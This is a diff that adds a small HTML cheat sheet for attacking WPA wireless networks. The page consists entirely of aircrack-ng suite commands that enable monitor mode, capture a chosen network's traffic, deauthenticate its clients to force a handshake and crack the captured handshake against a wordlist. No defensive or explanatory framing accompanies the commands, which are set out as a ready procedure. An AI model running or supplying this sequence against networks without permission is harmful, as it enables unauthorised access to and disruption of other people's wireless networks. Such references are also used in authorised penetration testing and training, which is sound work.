@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Wireless cheatsheet</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="css/style.css" />
+    <script src="main.js"></script>
+</head>
+<body>
+    <h1>WPA</h1>
+    <code>airmon-ng check kill</code>
+    <code>airmon-ng start [wlan0]</code>
+    <code>airodump-ng [wlan0mon]</code>
+    <code>airodump-ng --channel [channel] --bssid [bssid] --write [file] [wlan0mon]</code>
+    <code>aireplay-ng --deauth 5 -a [bssid] [wlan0mon]</code>
+    <code>aircrack-ng -a2 -b [bssid] -w [wordlist] [path.cap]</code>
+</body>
+</html>
